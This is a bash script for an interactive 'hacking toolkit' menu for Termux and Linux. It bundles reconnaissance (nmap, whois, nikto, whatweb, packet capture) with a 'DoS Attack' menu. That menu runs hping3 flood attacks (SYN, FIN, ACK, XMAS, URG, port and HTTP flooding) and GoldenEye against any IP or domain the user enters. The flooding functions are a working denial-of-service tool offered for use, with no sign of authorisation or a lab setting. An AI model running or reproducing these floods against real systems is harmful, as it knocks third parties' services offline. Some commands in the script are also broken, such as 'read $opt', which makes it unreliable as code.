#!/bin/bash

function logo()
{
    echo -e "\e[1;33m _____            ________                                                     \e[0m"    
    echo -e "\e[1;33m \    \          /    /__/                                                     \e[0m"                                                                          
    echo -e "\e[1;33m  \    \        /    /                                                         \e[0m"
    echo -e "\e[1;33m   \    \      /    /                             \  \  /  / |        |        \e[0m"                 
    echo -e "\e[1;33m    \    \    /    /                               \  \/  /  |        |        \e[0m"      
    echo -e "\e[1;33m     \    \  /    /_____                            \    /   |      __|        \e[0m"                
    echo -e "\e[1;33m      \    \/    /      | ||\  ||  /   \  ||\  /||  /    \   |  |\  \          \e[0m"
    echo -e "\e[1;33m       \        /|  |--   || \ || | | | | || \/ || /  /\  \  |  | \  \         \e[0m"         
    echo -e "\e[1;33m        \______/ |______| ||  \||  \___/  ||    ||/__/  \__\ |__|  \__\ {v0.2} \e[0m"
    echo
    echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    echo -e " AUTHOR : \e[1;36mARINDAM SAHA\e[0m" "EMAIL : \e[1;36marindamss007@gmail.com\e[0m" " INSTAGRAM : \e[1;36m@zokomon0007\e[0m"
    echo -e " FB     : \e[1;36mzokomon07\e[0m"
    echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
}

logo

echo
echo

echo "Select Your OS system :"
echo
echo "[1] Termux"
echo "[2] Linux OS"
echo
echo "Response :"
read os
function info()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                  Besic Details"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo dig $bip
    echo

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                         Advance ISP Details"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo whois $bip
    echo

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                          Network Service Details"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    echo
    $sudo nmap -A $bip
    echo

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                       Connected Wireless Device"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo iwconfig $bip
    echo

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                             Host Details"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"  

    echo
    $sudo host $bip
    echo
    
}

function dosattk()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                          Select Attack"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    echo
    echo -e "\e[1;31m[1] Syncronization Attack[Best]\e[0m"
    echo -e "\e[1;31m[2] FIN Attack\e[0m"
    echo -e "\e[1;31m[3] Acknoledgement Attack\e[0m"
    echo -e "\e[1;31m[4] TCP Acknoledgement Attack\e[0m"
    echo -e "\e[1;31m[5] XMAS Attack\e[0m"
    echo -e "\e[1;31m[6] YMAS Attack\e[0m"
    echo -e "\e[1;31m[7] URG Attack\e[0m"
    echo -e "\e[1;31m[8] Port Jamming[Best]\e[0m"
    echo -e "\e[1;31m[9] HTTP flooding\e[0m"
    echo -e "\e[1;31m[10] Exit\e[0m"
    echo -e "\e[1;31mRespond :\e[0m"
    read $opt
    case $opt in
        1)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -S -d $dosdata
        echo
        ;;
        2)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -F -d $dosdata
        echo
        ;;
        3)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -A -d $dosdata
        echo
        ;;
        4)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -L -d $dosdata
        echo
        ;;
        5)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -X -d $dosdata
        echo
        ;;
        6)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -Y -d $dosdata
        echo
        ;;
        7)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -U -d $dosdata
        echo
        ;;
        8)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the port number :-"
        read dosport
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -S -p $dosport -d $dosdata
        echo
        ;;
        9)
        dosdata=1200
        echo "Enter The IP-Address :- "
        read dosip
        echo "Enter the size of data(Default: 1200) :-"
        read dosdata
        echo
        echo "Ctrl + C for Stop Attck !"
        echo
        $sudo hping3 $dosip --flood -S -p 80 -d $dosdata
        echo
        ;;
    esac

}

function rts()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                         Route Tracing Start"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    echo "Ctrl + C to exit !"
    echo
    $sudo mtr $mtrip
    echo
}

function sns()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                       Start Network Scanning..."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    echo
    $sudo nmap $ipmap
    echo
}
function ipd()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "+                     Domain IP Lookup                                 +"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo dig $myip
    echo

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "+                     Your IP Info                                     +"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo ifconfig
    echo
}
function infos()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                      -: BESIC INFORMATION :-"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo dig $dip
    echo
    echo

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                -: ADVANCE ISP PROVIDER INFORMATIONS :-"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo whois $dip
    echo
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                         Network Service Details"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    echo
    $sudo nmap -A $dip
    echo

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                  -: CONNECTED WIRELESS DEVICES :-"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo iwconfig $dip
    echo

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                         -: HOST ADDRESS :-"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    $sudo host $dip
    echo
}

function nikts()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                          Analyzing Started"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    echo "Wait for a bit to scan, it can take a while....."
    echo
    echo "Ctrl + C to Stop Scan !"
    echo
    $sudo nikto -host $vaip
    echo
}

function rtts()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                          Route Tracing Start"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    echo "Ctrl + C to exit !"
    echo
    $sudo mtr -b $mtrip -P $mtrport
    echo
}

function whatis()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                          Website Informations"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

    echo
    echo
    $sudo whatweb -v -a 3 $domsc
    echo
}

function mrkh()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                       Start Malware Analysing ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo chkrootkit
    echo
    echo "Analysing Completed ...."
}

function nstats()
{
    
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                      NETWORK INTERFACE TABLE ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -i
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                      NETWORK ROUTING TABLE ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -r
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                      MULTICAST GROUP MEMERSHIP ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -g
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                          NETWORK STATISTICS ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -s
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                           NETWORK VERBOSE ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -V
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                   TCP SOCKET ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -t
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                   UDP SOCKET ..."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -u
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                   SCTP SOCKET ..."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -S
    echo
}

function direc()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                  All Folders"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo cd ~
    $sudo tree
    $sudo exit
    echo
    echo "All Directorys Are founded ..."
    echo
}

function lgfiles()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                  Log Files"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo ls /var/log
    echo
}

function netdetails()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			              NETWORK INTERFACE TABLE"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -i
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			              INTERNET PROTOCOL DETAILS"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo ifconfig
    echo
}

function srvsl()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                SERVER SOCKET LIST"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -l
    echo
}

function tmxlog()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                   LOG DETAILS"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo ls /data/data/com.termux/files/usr/var/log
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                  LIBRARY DETAILS"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo ls /data/data/com.termux/files/usr/var/lib
    echo
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "			                BINARY PACKAGE DETAILS"
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo ls /data/data/com.termux/files/usr/var/bin
}

function nitfs()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                      NETWORK INTERFACE TABLE ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -i
    echo
}

function vrbos()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                          VERBOSE DETAILS ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo netstat -V
    echo
}

function tres()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                          ALL DIRECTORIES ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo tree
}

function ipconf()
{
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                      NETWORK PROTOCOL DETAILS ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo ifconfig
}

function intldir()
{
    echo "Step 01 : Go to setting."
    echo "Step 02 : Goto App settings and find termux."
    echo "Step 03 : Go to permissions and enable storage permission."

    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo "                           ALL DIRECTORIES ...."
    echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    echo
    $sudo cd /sdcard
    $sudo tree
    $sudo cd ~
    echo
}

case $os in
    1)
    while ((option != 10))
    do

    logo

    echo
    echo
    echo
    echo -e "\e[1;31m[1] Information Gathering.\e[0m"
    echo -e "\e[1;31m[2] DoS Attcack.\e[0m"
    echo -e "\e[1;31m[3] Vulnerability Analysis.\e[0m"
    echo -e "\e[1;31m[4] Forensics.\e[0m"
    echo -e "\e[1;31m[5] Route Tracing(Linux OS-only).\e[0m"
    echo -e "\e[1;31m[6] Network Scanning\e[0m."
    echo -e "\e[1;31m[7] Aggresive webscan.\e[0m"
    echo -e "\e[1;31m[8] Packet Traceing(Network).\e[0m"
    echo -e "\e[1;31m[9] IP lookup.\e[0m"
    echo -e "\e[1;31m[10] Exit.\e[0m"
    echo -e "\e[1;31mResponse :\e[0m"
    read option
    
    echo "Your option is : " $option
    
    case $option in
        1)
        echo "Enter The IP-Address or Website :"
        read bip
        echo
        info
        echo
        ;;
        2)
        dodata=1200
        echo "Enter The https://Domain.com :- "
        read dosip
        echo "Enter Open Network Port :- "
        read dosport
        echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
        echo "                          Starting Dos Attack ...."
        echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

        echo
        echo "Ctrl + C for Stop Attck !"
        $sudo cd GoldenEye
        $sudo python goldeneye.py $dosip -s $dosport -m random
        $sudo cd ..
        echo
        ;;
        3)
        echo "Enter the (IP-Address or Domain.com) : "
        read vaip
        echo
        echo

        echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
        echo "                           Analyzing Started"
        echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

        echo
        echo "Wait for a bit to scan, it can take a while....."
        echo
        echo "Ctrl + C to Stop Scan !"
        echo
        $sudo cd nikto
        $sudo cd program
        $sudo perl nikto.pl -host $vaip
        $sudo cd ..
        $sudo cd ..
        ;;
        4)
        echo
        echo
        echo -e "\e[1;31m[1] Termux Logs & other details.\e[0m"
        echo -e "\e[1;31m[2] Network Interface.\e[0m"
        echo -e "\e[1;31m[3] Verbose.\e[0m"
        echo -e "\e[1;31m[4] Folder & Files In Termux.\e[0m"
        echo -e "\e[1;31m[5] Internet Configuration Protocols.\e[0m"
        echo -e "\e[1;31m[6] Internal Storage Directories.\e[0m"
        echo -e "\e[1;31m[7] Combind Details\e[0m"
        echo "Response >"
        read option

        case $option in
            1)
            tmxlog
            ;;
            2)
            nitfs
            ;;
            3)
            vrbos
            ;;
            4)
            tres
            ;;
            5)
            ipconf
            ;;
            6)
            intldir
            ;;
            7)
            tmxlog
            nitfs
            vrbos
            ipconf
            ;;
        esac
        echo
        ;;
        5)
        echo "Enter the IP-Address :"
        read mtrip
        echo
        rts
        echo
        ;;
        6)
        echo "Enter The IP-Address :"
        read ipmap
        echo
        sns
        echo
        ;;
        7)
        echo "Enter your domain.com :"
        read domsc
        echo

        echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
        echo "                           Website Informations"
        echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

        echo
        echo
        $sudo cd WhatWeb
        $sudo ruby whatweb -v -a 3 $domsc
        $sudo cd ..
        ;;
        8)
        echo "[1] Filtered Capture"
        echo "[2] Non-Filtered Capture"
        echo
        echo "Response >"
        read captype

        case $captype in
            1)
            echo
            echo "Enter the IP-Address for capture packets : "
            read pktip
            echo "Do you what to count packets ? [yes/no]"
            read ans

            case $ans in
                yes|Yes|YES|Y|y)
                echo "Enter the number of packets you want to capture ?"
                read pktcount

                echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                echo "                      Starting Packet Capturing ...."
                echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

                echo
                $sudo tshark -f $pktip -I -c $pktcount
                ;;
                *)
                echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                echo "                      Starting Packet Capturing ...."
                echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

                echo
                $sudo tshark -f $pktip -I
            esac
            ;;
            2)
            echo
            echo "Do you what to count packets ? [yes/no]"
            read ans

            case $ans in
                yes|Yes|YES|Y|y)
                echo "Enter the number of packets you want to capture ?"
                read pktcount

                echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                echo "                      Starting Packet Capturing ...."
                echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

                echo
                $sudo tshark -I -c $pktcount
                ;;
                *)
                echo "************************************************************************"
                echo "                      Starting Packet Capturing ...."
                echo "************************************************************************"

                echo
                $sudo tshark -I
                echo
            esac
        esac
        ;;
        9)
        echo
        echo "Enter Your Domain.com : "
        echo
        echo "Response >"
        read myip
        echo
        ipd
        ;;
        00)
        $exit
        ;;
    esac
    done
    ;;
    *)
    while ((option !=10))
    do

    logo

    echo
    echo
    echo
    echo -e "\e[1;31m[1] Information Gathering.\e[0m"
    echo -e "\e[1;31m[2] DoS Attcack.\e[0m"
    echo -e "\e[1;31m[3] Vulnerability Analysis.\e[0m"
    echo -e "\e[1;31m[4] Forensics.\e[0m"
    echo -e "\e[1;31m[5] Route Tracing.\e[0m"
    echo -e "\e[1;31m[6] Network Scanning\e[0m."
    echo -e "\e[1;31m[7] Aggresive webscan.\e[0m"
    echo -e "\e[1;31m[8] Packet Traceing(Network).\e[0m"
    echo -e "\e[1;31m[9] IP lookup.\e[0m"
    echo -e "\e[1;31m[10] Exit.\e[0m"
    echo -e "\e[1;31mResponse :\e[0m"
    read option

    echo "Your option is : " $option
    case $option in
        1)
        echo "Enter IP address or Website : "
        read dip
        infos
        echo
        echo
        ;;
        2)
        echo
        echo
        dosattk
        echo
        ;;
        3)
        echo "Enter the (IP-Address or Domain.com) : "
        read vaip
        echo
        echo
        nikts
        echo
        ;;
        4)
        echo
        echo
        echo -e "\e[1;31m[1] Malware & Rootkit Hunting.\e[0m"
        echo -e "\e[1;31m[2] Network Statistics.\e[0m"
        echo -e "\e[1;31m[3] All Directories In System.\e[0m"
        echo -e "\e[1;31m[4] Check Log Files.\e[0m"
        echo -e "\e[1;31m[5] Network Details.\e[0m"
        echo -e "\e[1;31m[6] Server Socket List.\e[0m"
        echo -e "\e[1;31m[7] Combind Details\e[0m"
        echo
        echo "Response :-"
        read option

        case $option in
            1)
            mrkh
            ;;
            2)
            nstats
            ;;
            3)
            direc
            ;;
            4)
            lgfiles
            ;;
            5)
            netdetails
            ;;
            6)
            srvsl
            ;;
            7)
            mrkh
            nstats
            lgfiles
            netdetails
            srvsl
            ;;
        esac
        echo
        ;;
        5)
        echo "Enter the IP-Address :"
        read mtrip
        echo "Enter the port address :"
        read mtrport
        rtts
        echo
        ;;
        6)
        echo "Enter The IP-Address :"
        read ipmap
        echo
        sns
        echo
        ;;
        7)
        echo "Enter your domain.com :"
        read domsc
        echo
        whatis
        echo
        ;;
        8)
        echo
        echo "[1] TCP Packet Scan"
        echo "[2] UDP Packet Scan"
        echo "[3] XMAS Scan"
        echo "[4] IP protocols"
        echo
        echo "Response >"
        read pktoption
        case $pktoption in
            1)
            echo "Enter the IP-Address : "
            read pktip

            echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
            echo "                        Starting Packet Scan ...."
            echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

            echo
            $sudo nmap --packet-trace $pktip
            ;;
            2)
            echo "Enter the IP-Address : "
            read pktip

            echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
            echo "                        Starting Packet Scan ...."
            echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

            echo
            $sudo nmap --packet-trace -sU $pktip
            ;;
            3)
            echo "Enter the IP-Address : "
            read pktip

            echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
            echo "                       Starting Packet Scan ...."
            echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
            
            echo
            $sudo nmap --packet-trace -sX $pktip
            ;;
            4)
            echo "Enter the IP-Address : "
            read pktip
            echo

            echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
            echo "                        Starting Packet Scan ...."
            echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
            
            echo
            $sudo nmap --packet-trace -sO $pktip
            ;;
        esac
        ;;
        9)
        echo
        echo "Enter Your Domain.com : "
        echo
        echo "Response >"
        read myip
        echo
        ipd
        echo
        ;;
    esac
    done
    ;;
esac
    
